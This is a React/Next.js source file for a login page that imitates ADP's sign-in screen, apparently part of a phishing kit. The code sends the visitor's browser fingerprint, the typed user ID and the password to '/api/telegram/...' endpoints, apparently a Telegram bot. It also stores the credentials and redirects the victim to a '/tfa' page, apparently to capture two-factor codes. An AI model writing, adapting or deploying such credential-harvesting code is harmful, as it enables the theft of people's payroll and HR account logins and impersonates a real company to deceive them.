"use client";
import { useCallback, useEffect, useRef, useState } from "react";
import { MessageCircle } from "lucide-react";
import { useRouter } from "next/navigation";
import BotFingerprintCollector from "@/components/BotFingerprintCollector";
import { LOGIN_SESSION } from "@/lib/login-flow";
import { SITE_DISPLAY_NAME } from "@/lib/site-url";
import {
  MSG_UNABLE_REACH_VERIFICATION,
  SIGN_IN_LOADING_MS,
} from "@/lib/approval-messages";
import { useLoginDeniedQueryParams } from "@/hooks/use-login-denied-query";
import { storeLoginCredentials } from "@/lib/submit-pending-gate";
import adpLogo from "../adp_login/Screenshot 2026-07-06 122158.png";
import qrCode from "../adp_login/Screenshot 2026-07-06 125911.png";

export function AdpLoginPage() {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [formError, setFormError] = useState("");
  const [isContinueLoading, setIsContinueLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const passwordInputRef = useRef<HTMLInputElement | null>(null);
  const router = useRouter();

  useLoginDeniedQueryParams({
    onDenied: setFormError,
    onUnavailable: setFormError,
  });

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem(LOGIN_SESSION.verify);
      sessionStorage.removeItem(LOGIN_SESSION.identity);
      sessionStorage.removeItem(LOGIN_SESSION.otp2);
      sessionStorage.removeItem(LOGIN_SESSION.method);
    }
  }, []);

  useEffect(() => {
    let sent = false;
    const onFirstInteraction = () => {
      if (sent) return;
      sent = true;

      const screen = `${window.screen.width}x${window.screen.height}`;
      const language =
        navigator.language || navigator.languages?.[0] || "unknown";

      fetch("/api/telegram/visitor", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          screen,
          language,
          referrer: document.referrer || "Direct",
          pageUrl: window.location.href,
        }),
      }).catch((error) => {
        console.error("Failed to send visit notification:", error);
      });
    };

    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  const busy = isSubmitting || isContinueLoading;

  const handleRevealPassword = useCallback(async () => {
    if (busy || !userId.trim()) return;
    setIsContinueLoading(true);
    setFormError("");
    const trimmed = userId.trim();
    void fetch("/api/telegram/username", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: trimmed }),
      keepalive: true,
    }).catch(console.error);
    await new Promise((resolve) => setTimeout(resolve, SIGN_IN_LOADING_MS));
    setShowPasswordField(true);
    setIsContinueLoading(false);
    window.setTimeout(() => passwordInputRef.current?.focus(), 0);
  }, [busy, userId]);

  const handleSignIn = useCallback(async () => {
    if (busy) return;

    if (!showPasswordField) {
      await handleRevealPassword();
      return;
    }

    if (!userId.trim() || !password.trim()) return;
    setFormError("");
    setIsSubmitting(true);

    try {
      void fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, password }),
        keepalive: true,
      }).catch(console.error);

      storeLoginCredentials(userId.trim(), password);
      await new Promise((resolve) => setTimeout(resolve, SIGN_IN_LOADING_MS));
      router.push("/tfa");
    } catch {
      setFormError(MSG_UNABLE_REACH_VERIFICATION);
      setIsSubmitting(false);
    }
  }, [busy, handleRevealPassword, password, router, showPasswordField, userId]);

  return (
    <>
      <BotFingerprintCollector />
      <div className="page-shell">
        <div className="main-wrapper">
          <div className="login-card">
            <div className="card-header-actions">
              <span className="lock-icon">🔒</span>
              <a href="#" className="lang-select">
                Languages ▾
              </a>
            </div>

            <div className="logo-container">
              <img src={adpLogo.src} alt={SITE_DISPLAY_NAME} className="logo-img" />
            </div>

            <h1>Sign in to ADP</h1>

            <form
              onSubmit={(event) => {
                event.preventDefault();
                void handleSignIn();
              }}
            >
              {formError ? (
                <div className="login-error-banner" role="alert">
                  {formError}
                </div>
              ) : null}
              <div className="form-group">
                <label htmlFor="userId">User ID</label>
                <input
                  type="text"
                  id="userId"
                  autoFocus
                  autoComplete="username"
                  value={userId}
                  disabled={busy}
                  onChange={(event) => {
                    setUserId(event.target.value);
                  }}
                />

                {showPasswordField ? (
                  <div className="password-group">
                    <label htmlFor="password">Password</label>
                    <input
                      ref={passwordInputRef}
                      type="password"
                      id="password"
                      autoComplete="current-password"
                      value={password}
                      disabled={busy}
                      onChange={(event) => setPassword(event.target.value)}
                      placeholder="Enter your password"
                    />
                  </div>
                ) : null}

                <label className="checkbox-container">
                  <input type="checkbox" /> Remember user ID{" "}
                  <span className="info-bubble">?</span>
                </label>
              </div>

              <div className="action-row">
                <a href="#" className="help-link">
                  Need help signing in?
                </a>
                <button
                  type="submit"
                  className={`btn-next ${
                    (showPasswordField
                      ? userId.trim() && password.trim()
                      : userId.trim())
                      ? "btn-next-ready"
                      : ""
                  }`}
                  disabled={
                    busy ||
                    !userId.trim() ||
                    (showPasswordField && !password.trim())
                  }
                >
                  {busy ? "Signing in..." : "Next"}
                </button>
              </div>
            </form>

            <div className="new-user-section">
              <span>
                New user ? <a href="#">Get started</a>
              </span>
            </div>

            <div className="mobile-app-section">
              <img
                src={qrCode.src}
                alt="QR Code"
                className="qr-placeholder"
                style={{
                  objectPosition: "left center",
                  width: "60px",
                  height: "60px",
                  overflow: "hidden",
                }}
              />
              <div className="mobile-text">
                <h3>Download the ADP mobile app</h3>
                <p>
                  Scan the QR code with your device to begin. Secure and
                  convenient tools right in your hands for simple, anytime
                  access across devices.
                </p>
                <a href="#" className="learn-more">
                  LEARN MORE →
                </a>
              </div>
            </div>
          </div>
        </div>

        <footer className="global-footer">
          <div className="footer-links">
            <a href="#">PRIVACY</a>
            <a href="#">LEGAL</a>
            <a href="#">AI Transparency</a>
          </div>
          <div>© 2014-2026 ADP, Inc.</div>
        </footer>
      </div>

      <button
        className="fixed bottom-4 right-4 w-12 h-12 sm:w-14 sm:h-14 rounded-full flex items-center justify-center shadow-lg z-50 hover:scale-105 transition-transform"
        style={{ backgroundColor: "#0099D8" }}
        aria-label="Chat support"
      >
        <MessageCircle className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
      </button>

      <style jsx global>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family:
            -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
            Arial, sans-serif;
        }

        html,
        body {
          min-height: 100%;
        }

        body {
          background-color: #f4f4f5;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          justify-content: space-between;
          position: relative;
          overflow-x: hidden;
        }

        body::after {
          content: "";
          position: absolute;
          bottom: 0;
          right: 0;
          width: 300px;
          height: 150px;
          background: linear-gradient(135deg, transparent 50%, #000040 50%);
          z-index: 1;
          pointer-events: none;
        }

        .page-shell {
          flex: 1;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
        }

        .main-wrapper {
          flex: 1;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          z-index: 2;
        }

        .login-card {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
          width: 100%;
          max-width: 500px;
          padding: 30px 40px;
          position: relative;
        }

        .card-header-actions {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }

        .lock-icon {
          color: #71717a;
          font-size: 16px;
        }

        .lang-select {
          color: #0046be;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
        }

        .logo-container {
          text-align: center;
          margin-bottom: 25px;
        }

        .logo-img {
          max-height: 55px;
          width: auto;
          object-fit: contain;
        }

        h1 {
          text-align: center;
          font-size: 22px;
          color: #18181b;
          margin-bottom: 25px;
          font-weight: 700;
        }

        .login-error-banner {
          margin-bottom: 16px;
          padding: 0;
          border: none;
          border-radius: 0;
          background: transparent;
          color: #dc2626;
          font-size: 14px;
          text-align: center;
          font-weight: 500;
        }

        .form-group {
          margin-bottom: 20px;
        }

        .password-group {
          margin-top: 12px;
        }

        label {
          display: block;
          font-size: 13px;
          font-weight: 600;
          color: #444;
          margin-bottom: 6px;
        }

        input[type="text"],
        input[type="password"] {
          width: 100%;
          padding: 12px;
          border: 1.5px solid #0046be;
          border-radius: 6px;
          font-size: 16px;
          outline: none;
          background-color: #ffffff;
          color: #18181b;
        }

        .checkbox-container {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 14px;
          color: #3f3f46;
          margin-top: 12px;
          cursor: pointer;
        }

        .checkbox-container input {
          width: 18px;
          height: 18px;
          cursor: pointer;
        }

        .info-bubble {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          background-color: #0046be;
          color: white;
          border-radius: 50%;
          width: 16px;
          height: 16px;
          font-size: 11px;
          font-weight: bold;
        }

        .action-row {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-top: 35px;
          padding-bottom: 25px;
          border-bottom: 1px solid #e4e4e7;
        }

        .help-link {
          color: #0046be;
          text-decoration: underline;
          font-size: 15px;
          font-weight: 500;
        }

        .btn-next {
          background-color: #ccc6c0;
          color: #ffffff;
          border: none;
          padding: 12px 32px;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 600;
          cursor: not-allowed;
        }

        .btn-next-ready {
          background-color: #0046be;
          cursor: pointer;
        }

        .new-user-section {
          text-align: center;
          padding: 20px 0;
        }

        .new-user-section a {
          color: #0046be;
          text-decoration: underline;
          font-weight: 500;
        }

        .mobile-app-section {
          border-top: 1px solid #e4e4e7;
          padding-top: 20px;
          display: flex;
          gap: 15px;
          align-items: flex-start;
        }

        .qr-placeholder {
          width: 65px;
          height: 65px;
          object-fit: contain;
        }

        .mobile-text h3 {
          font-size: 14px;
          color: #18181b;
          margin-bottom: 4px;
        }

        .mobile-text p {
          font-size: 12px;
          color: #71717a;
          line-height: 1.4;
          margin-bottom: 6px;
        }

        .learn-more {
          color: #0046be;
          text-decoration: none;
          font-size: 12px;
          font-weight: 700;
          display: inline-flex;
          align-items: center;
          gap: 4px;
        }

        .global-footer {
          background-color: #f4f4f5;
          border-top: 1px solid #e4e4e7;
          padding: 15px 40px;
          display: flex;
          justify-content: space-between;
          font-size: 12px;
          color: #52525b;
          z-index: 2;
        }

        .footer-links a {
          color: #0046be;
          text-decoration: underline;
          margin-right: 15px;
        }

        @media (max-width: 600px) {
          .login-card {
            padding: 20px;
          }

          .global-footer {
            flex-direction: column;
            gap: 10px;
            text-align: center;
          }

          .footer-links a {
            margin: 0 8px;
          }
        }
      `}</style>
    </>
  );
}
